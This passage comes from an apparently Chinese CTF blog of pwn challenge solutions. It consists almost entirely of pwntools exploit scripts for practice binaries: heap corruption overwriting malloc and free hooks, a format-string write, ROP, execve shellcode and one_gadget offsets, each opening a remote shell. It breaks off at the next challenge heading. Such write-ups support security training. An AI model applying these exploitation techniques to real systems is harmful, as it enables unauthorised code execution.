class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">lib = ELF("libc-2.23_x64.so")</span><br><span class="line">sh = 0</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil("choose:\n")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil("Which item?\n")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def show(idx):</span><br><span class="line">sh.recvuntil("choose:\n")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil("Which item?")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def showList():</span><br><span class="line">sh.recvuntil("choose:\n")</span><br><span class="line">sh.sendline("2")</span><br><span class="line"></span><br><span class="line">def add(name,size,content):</span><br><span class="line">sh.recvuntil("choose:\n")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil("Item name?")</span><br><span class="line">sh.sendline(name)</span><br><span class="line">sh.recvuntil("len?\n")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil("Description?\n")</span><br><span class="line">sh.sendline(content)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./itemboard")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">add("a"*0x10,0x80,"1"*0x7F)</span><br><span class="line">add("b"*0x10,0x10,"2"*0xF)</span><br><span class="line">free(0)</span><br><span class="line">show(0)</span><br><span class="line">sh.recvuntil("Description:")</span><br><span class="line">main_arena = u64(sh.recv(6)+"\x00\x00") - 88</span><br><span class="line">libc = main_arena - lib.symbols['__malloc_hook'] - 0x10</span><br><span class="line">system_addr = libc + lib.symbols['system']</span><br><span class="line">add("c"*0x10,0x20,"3"*0xF)</span><br><span class="line">add("d"*0x10,0x20,"4"*0xF)</span><br><span class="line">free(1)</span><br><span class="line">free(2)</span><br><span class="line">show(2)</span><br><span class="line">log.success("main_arena: " + hex(main_arena))</span><br><span class="line">log.success("system_addr: " + hex(system_addr))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">add("6666",24,"/bin/sh;eeeeeeee"+p64(system_addr))</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">#nc pwn2.jarvisoj.com 9887</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",27048,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x91-jarvisoj-fm"><a href="#0x91-jarvisoj-fm" class="headerlink" title="0x91 jarvisoj_fm"></a>0x91 jarvisoj_fm</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("node3.buuoj.cn",28276)</span><br><span class="line">#sh = process("./fm")</span><br><span class="line">payload = p32(0x0804A02C)+'%11$n'</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x92-pwnable-orw"><a href="#0x92-pwnable-orw" class="headerlink" title="0x92 pwnable_orw"></a>0x92 pwnable_orw</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("orw")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./orw")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">shellcode = shellcraft.open("/flag")</span><br><span class="line">shellcode += shellcraft.read(3,elf.bss(),0x100)</span><br><span class="line">shellcode += shellcraft.write(1,elf.bss(),0x100)</span><br><span class="line">sh.sendline(asm(shellcode))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",28498,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x93-jarvisoj-typo"><a href="#0x93-jarvisoj-typo" class="headerlink" title="0x93 jarvisoj_typo"></a>0x93 jarvisoj_typo</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#sh = process("./typo")</span><br><span class="line">sh = remote("node3.buuoj.cn",28213)</span><br><span class="line">elf = ELF("typo")</span><br><span class="line">offset = 112</span><br><span class="line">pop3_ret = 0x00020904</span><br><span class="line">payload  = offset * "a" </span><br><span class="line">payload += p32(pop3_ret) + p32(elf.search("/bin/sh\x00").next()) + p32(0) + p32(0x110B4)</span><br><span class="line">sh.sendlineafter("\n","")</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x94-others-shellcode"><a href="#0x94-others-shellcode" class="headerlink" title="0x94 others_shellcode"></a>0x94 others_shellcode</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">连接就出flag 有点水</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x95-huxiangbei-2019-hacknote"><a href="#0x95-huxiangbei-2019-hacknote" class="headerlink" title="0x95 huxiangbei_2019_hacknote"></a>0x95 huxiangbei_2019_hacknote</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("HackNote")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./true")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter("-----------------","1")</span><br><span class="line">sh.sendlineafter("Input the Size",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter("-----------------","2")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.sendlineafter("-----------------","3")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">shellcode = asm("xor rax,rax")</span><br><span class="line">shellcode += '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'</span><br><span class="line">__free_hook = 0x6CD5E8</span><br><span class="line">__malloc_hook = 0x6CB788</span><br><span class="line">add(0x18,'\x11'*0x18)</span><br><span class="line">edit(0, '\x11'*0x18)</span><br><span class="line">add(0x18, '\x12'*0x18)</span><br><span class="line">add(0x40-8,'\x13'*0x38)</span><br><span class="line">add(0x10, '\x14'*0x10)</span><br><span class="line">add(0x10, '\x15'*0x10)</span><br><span class="line">edit(0,'\x11'*0x18+'\x81'+'\n')</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line">add(0x80-8,'A'*0x18+p64(0x41)+p64(__malloc_hook - 0x10  - 6)+'\n')</span><br><span class="line">add(0x38,'aaaa\n')</span><br><span class="line">add(0x38,'aaaaaa' + p64(__malloc_hook + 8) + shellcode + "\n")</span><br><span class="line">add(0x88,'\n')</span><br><span class="line">'''</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">'''</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",26378,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x96-shanghai2019-boringheap"><a href="#0x96-shanghai2019-boringheap" class="headerlink" title="0x96 shanghai2019_boringheap"></a>0x96 shanghai2019_boringheap</h2><h3 id="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"><a href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18" class="headerlink" title="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"></a>该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">#sh = process("./pwn",env={"LD_PRELOAD":"/home/pig/Pig/CTF/ShangHai/19.11.2/pwn/boringheap/libc.so"})</span><br><span class="line">sh = process("./pwn")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23_x64.so")</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.sendlineafter("5.","1")#0x20 0x30 0x40</span><br><span class="line">sh.sendlineafter("3.Large",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">sh.sendlineafter("5.","2")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">sh.sendlineafter("?",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def show(idx):</span><br><span class="line">sh.sendlineafter("5.","4")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter("5.","3")</span><br><span class="line">sh.sendlineafter("?",str(idx))</span><br><span class="line">add(3,"\x11" * 0x40)</span><br><span class="line">add(2,'\x12' * 0x30)</span><br><span class="line">add(3,'\x13' * 0x40)</span><br><span class="line">add(3,'\x14' * 0x40)</span><br><span class="line">add(1,p64(0) + p64(0x51) + "\n")</span><br><span class="line">#payload = 'a' * 0x28 + '\xa1'</span><br><span class="line">payload = p64(0)*3 + p64(0x91) + '\n'</span><br><span class="line">edit(1,0x80000000,payload)</span><br><span class="line">free(1)</span><br><span class="line">add(2,'\n')</span><br><span class="line">show(5)</span><br><span class="line">libc = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00')) - 2 + 8 - lib.symbols['__malloc_hook']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">add(3,'\x15' * 0x40)</span><br><span class="line">free(2)</span><br><span class="line">free(4)</span><br><span class="line">edit(6,0,p64(__malloc_hook - (0x7fd96e4f4b10 - 0x7fd96e4f4b2d)) + '\n')</span><br><span class="line"></span><br><span class="line">add(3,'\n')</span><br><span class="line">add(3,'\x00'*3 + p64(__malloc_hook + 0x10 + 48) + p64(0)*2 + p64(0x51) + '\n')</span><br><span class="line">add(3,'a' * 0x17+'\n')</span><br><span class="line">show(9)</span><br><span class="line">sh.recvuntil("a" * 0x17 + '\n')</span><br><span class="line">heap_base = (u64(sh.recvuntil("\n",True)[-6:].ljust(8,'\x00')) >> 12) << 12</span><br><span class="line">pie = heap_base - 0x203000</span><br><span class="line">chunk_list = pie + 0x2020C0</span><br><span class="line"></span><br><span class="line">#edit(8,0,'\x00'*3 + p64(heap_base + 0x140) + p64(0) * 2 + "\n")</span><br><span class="line">edit(8,0,'\x00'*3 + p64(0) * 5 + "\n")</span><br><span class="line">#add(3,p64(0) * 3 + p64(0xffffffffffffffff) + "\n")</span><br><span class="line">edit(9,0,p64(0) * 3 + p64(__malloc_hook - 0x10) + "\n")</span><br><span class="line">#add(3,'\x00' * 3 + p64(0) + p64(__free_hook) + p64(0) + p64(binsh) + "\n")</span><br><span class="line">#edit(3,0,p64(system) + "\n")</span><br><span class="line">#free(5)</span><br><span class="line">#add(1,'/bin/sh\n')</span><br><span class="line">'''</span><br><span class="line">0x45216 execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve("/bin/sh", rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">'''</span><br><span class="line">one_gadget = libc + 0xf1147</span><br><span class="line">add(2,p64(one_gadget) + '\n')</span><br><span class="line">sh.sendlineafter("5.","1")</span><br><span class="line">sh.sendlineafter("3.","1")</span><br><span class="line">log.success("heap_base: " + hex(heap_base))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">'''</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">'''</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",26065,1)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x97-shanghai2019-login"><a href="#0x97-shanghai2019-login" class="headerlink" title="0x97 shanghai2019_login"></a>0x97 shanghai2019_login</h2><h3 id="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-1"><a href="#该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18-1" class="headerlink" title="该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18"></a>该exp是真实比赛的exp，ubuntu16，Buuoj为Ubuntu18</h3><h3 id="爆破libc"><a href="#爆破libc" class="headerlink" title="爆破libc"></a>爆破libc</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("login")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global lib</span><br><span class="line">global sh</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./login")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23_x64.so")</span><br><span class="line">def register(idx,size,content):</span><br><span class="line">sh.sendlineafter(":","2")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendafter(":",str(content))</span><br><span class="line">def login(idx,size,content):</span><br><span class="line">sh.sendlineafter(":","1")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendlineafter(":",str(size))</span><br><span class="line">sh.sendafter(":",content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.sendlineafter(":","3")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.sendlineafter(":","4")</span><br><span class="line">sh.sendlineafter(":",str(idx))</span><br><span class="line">sh.sendafter(":",str(content))</span><br><span class="line">def bomb(pos,content):</span><br><span class="line">global sh</span><br><span class="line">for i in range(0,0xff):</span><br><span class="line">payload = p64(0) + p64(0x21) + p64(elf.got['__libc_start_main'] + 5 - pos) + p64(elf.plt['puts']) + p64(pos + 1)</span><br><span class="line">        edit(1,payload)</span><br><span class="line">        login(0,pos + 1,chr(i) + content)</span><br><span class="line">data = sh.recvuntil('---Menu---')</span><br><span class="line">print(i)</span><br><span class="line">if(data.find("success") != -1):</span><br><span class="line">log.success("get!" + hex(i))</span><br><span class="line">return i</span><br><span class="line">register(0,0x68,'\x11' * 0x68)</span><br><span class="line">register(1,0x68,'\x22' * 0x68)</span><br><span class="line">free(0)</span><br><span class="line">free(1)</span><br><span class="line">#0x400B94 call</span><br><span class="line">#0x400B53 read</span><br><span class="line">#login(0,0x7fffffff,p64(elf.got['__libc_start_main']) + p64(elf.plt['puts']))</span><br><span class="line">#edit(0,p64(0))</span><br><span class="line"></span><br><span class="line">#payload = p64(0) + p64(0x21) + p64(elf.got['__libc_start_main'] + 5) + p64(elf.plt['puts']) + p64(1)</span><br><span class="line">#edit(1,payload)</span><br><span class="line">#login(0,1,'\x7f')</span><br><span class="line">#__libc_start_main = chr(bomb(0,''))</span><br><span class="line">__libc_start_main = '\x7f'</span><br><span class="line">__libc_start_main = chr(bomb(1,__libc_start_main)) + __libc_start_main</span><br><span class="line">__libc_start_main = chr(bomb(2,__libc_start_main)) + __libc_start_main</span><br><span class="line">__libc_start_main = chr(bomb(3,__libc_start_main)) + __libc_start_main</span><br><span class="line">__libc_start_main = chr(bomb(4,__libc_start_main)) + __libc_start_main</span><br><span class="line">#__libc_start_main = chr(bomb(5,__libc_start_main)) + __libc_start_main</span><br><span class="line">__libc_start_main = '\x40' + __libc_start_main</span><br><span class="line">__libc_start_main = u64(__libc_start_main.ljust(8,'\x00'))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">log.success("__libc_start_main_got: " + hex(elf.got['__libc_start_main']))</span><br><span class="line">log.success("puts_plt: " + hex(elf.plt['puts'])) </span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc +lib.symbols['system']</span><br><span class="line">binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line">__free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line">__malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"></span><br><span class="line">payload = p64(0) + p64(0x21) + p64(binsh) + p64(system) + p64(8)</span><br><span class="line">edit(1,payload)</span><br><span class="line">login(0,8,'/bin/sh\x00')</span><br><span class="line"></span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("__free_hook: " + hex(__free_hook))</span><br><span class="line">log.success("__malloc_hook: " + hex(__malloc_hook))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",25522,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x98-xdctf2015-pwn200"><a href="#0x98-xdctf2015-pwn200" class="headerlink" title="0x98 xdctf2015_pwn200"></a>0x98 xdctf2015_pwn200</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 